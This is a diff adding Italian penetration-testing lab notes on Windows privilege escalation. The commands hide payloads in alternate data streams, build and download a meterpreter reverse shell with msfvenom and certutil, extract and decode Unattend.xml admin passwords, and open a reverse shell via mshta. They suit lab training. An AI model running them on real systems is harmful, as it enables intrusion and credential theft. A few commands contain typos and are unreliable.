@@ -500,3 +500,179 @@ Una volta ottenuto accesso come Administrator possiamo passare anche ad altri to
 ```
 impersonate_token "NT AUTHORITY SYSTEM"
 ```
+
+## Windows File System Vulnerabilities
+
+### Alternate Data Stream (Resource Stream)
+
+è possibile creare dei file nascosti dietro ad altri file legittimi, attraverso lo sfruttamento dei metadati del file legittimo. Utile a nascondere degli exploit.
+
+Possiamo creare un file nascosto se lo scriviamo come secondo file a seguito di due punti (:), ossia:
+
+```
+notepad test.txt:secret.txt
+```
+
+#### Esempio di attacco <a href="#attacco" id="attacco"></a>
+
+Abbiamo il file binario di winPEAS che serve a fare local enumeration su sistema windows per identificare vulnerabilità che possono essere exploitate per poter fare privilege escalation.
+
+Lo usiamo come esempio di payload, rinominandolo appunto payload e spostandolo in una cartella C:\Temp
+
+```
+type payload.exe > windowslog.txt:winpeas.exe
+notepad windowslog.txt
+start windowslog.txt:winpeas.txt //Risulta in: Access is Denied
+//Creiamo un symbolic link in system32 in modo da poter avviare il programma altrimenti non funziona:
+mklink wupdate.exe C:\Temp\windowslog.txt:winpeas.exe
+wupdate //E ci viene eseguito winpeas che era il nostro payload
+```
+
+## Windows Credential Dumping
+
+### Windows Password Hashes
+
+<figure><img src="../.gitbook/assets/image.png" alt=""><figcaption></figcaption></figure>
+
+Prima si fa privilege escalation, e poi con la sessione amministrativa si fa il dump delle credenziali.
+
+Tool come mimikatz vanno a leggere la cache del processo LSASS che interagisce con LSA per avere una copia degli hash NTLM.
+
+#### LM Hash
+
+<figure><img src="../.gitbook/assets/image (1).png" alt=""><figcaption></figcaption></figure>
+
+### NTLM Hash
+
+<figure><img src="../.gitbook/assets/image (2).png" alt=""><figcaption></figcaption></figure>
+
+Non hanno password salts, quindi possono essere craccate con brute force e rainbow attack.
+
+### Searching For Passwords In Windows Configuration Files
+
+* The Unattended Windows Setup utility will typically utilize one of the following configuration files that contain user account and system configuration information:
+  * `C:\Windows\Panther\Unattend.xml`
+  * `C:\Windows\Panther\Autounattend.xml`
+* As a security precaution, the passwords stored in the Unattended Windows Setup configuration file may be encoded in base64.
+
+#### Esempio di attacco avendo accesso parziale alla macchina vittima
+
+#### Macchina attaccante: generazione meterpreter payload e caricamento su http server
+
+```
+//Generare un peterpreter payload con msfvenom
+msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.5.2 LPORT=1234 -f exe > payload.exe
+//Carichiamo il file sulla macchina vittima tramite http server
+python -m SimpleHTTPServer 80
+```
+
+#### Macchina vittima: Download payload meterpreter
+
+```
+cd Desktop
+certutil -f http://10.10.5.2/payload.exe payload.exe
+```
+
+#### Macchina attaccante: Stoppiamo il server HTTP e avviamo Metasploit Framework per avere il multi handler in ascolto per quando avvieremo il payload sulla vittima
+
+```
+service postgresql start && msfconsole
+use multi/handler
+set payload windows/x64/meterpreter/reverse_tcp
+set LPORT 1234
+set LHSOT 10.10.5.2
+run
+//andiamo sulla vittima e clicchiamo per eseguire il payload.exe e ci arriva una connessione
+```
+
+#### Macchina attaccante: Riceviamo la meterpreter session sul multi/handler
+
+```
+sysinfo
+search -f Unattend.xml //ovviamente è più comodo farlo a mano sapendo dov'è
+cd C:\Windows\Panther
+dir
+download Unattend.xml
+//ci spostiamo in un altro terminale per poter leggere il file senza chiudere MSF
+cat Unattended.xml
+// se andiamo in fondo al file troviamo un tag xml <AutoLogon> che contiene username e password encoded in Base64
+// copiamo la password
+vim password.txt //creiamo un nuovo file e la incolliamo dentro (usciamo con :wq)
+//usiamo il tool base64 presente in Kali per decodificare la password
+base64 -d password.txt
+//verifichiamo che la password ottenuta sia ancora valida connettendoci con psexec
+psexec.py Administrator@10.2.27.165 //alternativa: modulo psexec di MSF invece che in py
+    whoami
+```
+
+Potrebbe essere che l'amministratore abbia cambiato la password dopo l'installazione e che quindi questa sia obsoleta
+
+### Alternativa per trovare password in file Unattended usando PowerSploit
+
+This lab covers usage of **PowerUp.ps1** Powershell script to find a common Windows privilege escalation flaw.
+
+**PowerSploit**: PowerSploit is a collection of Microsoft PowerShell modules that can be used to aid penetration testers during all phases of an assessment.
+
+**PowerUp.ps1:** PowerUp aims to be a clearing house of common Windows privilege escalation vectors that rely on misconfigurations.
+
+Source: https://github.com/PowerShellMafia/PowerSploit
+
+***
+
+#### **Aprire il powershell della macchina attaccante ed eseguire PowerUp.ps1  per trovare le vulnerabilità sfruttabili per privilege escalation**
+
+```
+cd .\Desktop\PowerSploit\Privesc\
+ls
+powershell -ep bypass (PowerShell execution policy bypass)
+. .\PowerUp.ps1
+Invoke-PrivescAudit
+```
+
+We can notice that there is an **Unattend.xml** file present on the system. Open the **Unattend.xml** file.
+
+#### **Leggiamo il file Unattended.xml**
+
+```
+cat C:\Windows\Panther\Unattend.xml
+```
+
+We have discovered an administrator encoded password. i.e **“QWRtaW5AMTIz”**.
+
+#### Decodifichiamo la password utilizzando Powershell
+
+```
+$password='QWRtaW5AMTIz'
+$password=[System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($pa
+ssword))
+echo $password
+```
+
+The administrator password is **“Admin@123”**.
+
+#### Avviamo un command prompi come administrator con le credenziali scoperte
+
+```
+runas.exe /user:administrator cmd
+Admin@123
+whoami
+```
+
+#### Macchina attaccante: Eseguire il modulo MSF hta\_serverper ottenre una meterpreter shell
+
+```
+msfconsole -q
+use exploit/windows/misc/hta_server
+exploit
+```
+
+Copy the generated payload i.e **“http://10.10.31.2:8080/Bn75U0NL8ONS.hta”** and run it on the victim cmd.exe with mshta command to gain the meterpreter shell.
+
+#### Macchina vittima: eseguire nel CMD administrator mshta per ottenere la reverse shell
+
+```
+mshta.exe http://10.10.31.2:8080/Bn75U0NL8ONS.hta
+```
+
+Sulla macchina attaccante viene aperta una reverse shell (per trovarla provare _sessions -i 1_).
+
